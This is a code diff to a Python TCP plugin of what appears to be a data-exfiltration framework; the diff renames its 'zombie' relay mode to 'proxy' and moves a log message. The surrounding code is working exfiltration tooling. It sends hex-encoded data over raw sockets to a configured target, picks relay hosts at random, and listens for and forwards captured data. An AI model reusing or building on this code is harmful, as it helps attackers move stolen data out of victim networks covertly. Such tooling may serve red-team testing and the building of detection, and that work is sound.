@@ -6,8 +6,8 @@ config = None
 app_exfiltrate = None
 
 def send(data):
-    if config.has_key('zombies') and config['zombies'] != [""]:
-        targets = [config['target']] + config['zombies']
+    if config.has_key('proxies') and config['proxies'] != [""]:
+        targets = [config['target']] + config['proxies']
         target = choice(targets)
     else:
         target = config['target']
@@ -20,6 +20,7 @@ def send(data):
     client_socket.close()
 
 def listen():
+    app_exfiltrate.log_message('info', "[tcp] Waiting for connections...")
     sniff(handler=app_exfiltrate.retrieve_data)
 
 def sniff(handler):
@@ -38,7 +39,6 @@ def sniff(handler):
         sys.exit(-1)
 
     while True:
-        app_exfiltrate.log_message('info', "[tcp] Waiting for connections...")
         connection, client_address = sock.accept()
         try:
             app_exfiltrate.log_message(
@@ -50,7 +50,6 @@ def sniff(handler):
                         'info', "[tcp] Received {} bytes".format(len(data)))
                     try:
                         data = data.decode('hex')
-                        #app_exfiltrate.retrieve_data(data)
                         handler(data)
                     except Exception, e:
                         app_exfiltrate.log_message(
@@ -64,14 +63,14 @@ def relay_tcp_packet(data):
     target = config['target']
     port = config['port']
     app_exfiltrate.log_message(
-        'info', "[zombie] [tcp] Relaying {0} bytes to {1}".format(len(data), target))
+        'info', "[proxy] [tcp] Relaying {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((target, port))
     client_socket.send(data.encode('hex'))
     client_socket.close()
 
-def zombie():
-    app_exfiltrate.log_message('info', "[zombie] [tcp] Waiting for connections...")
+def proxy():
+    app_exfiltrate.log_message('info', "[proxy] [tcp] Waiting for connections...")
     sniff(handler=relay_tcp_packet)
 
 class Plugin:
@@ -81,4 +80,4 @@ class Plugin:
         global app_exfiltrate
         config = conf
         app_exfiltrate = app
-        app.register_plugin('tcp', {'send': send, 'listen': listen, 'zombie': zombie})
+        app.register_plugin('tcp', {'send': send, 'listen': listen, 'proxy': proxy})
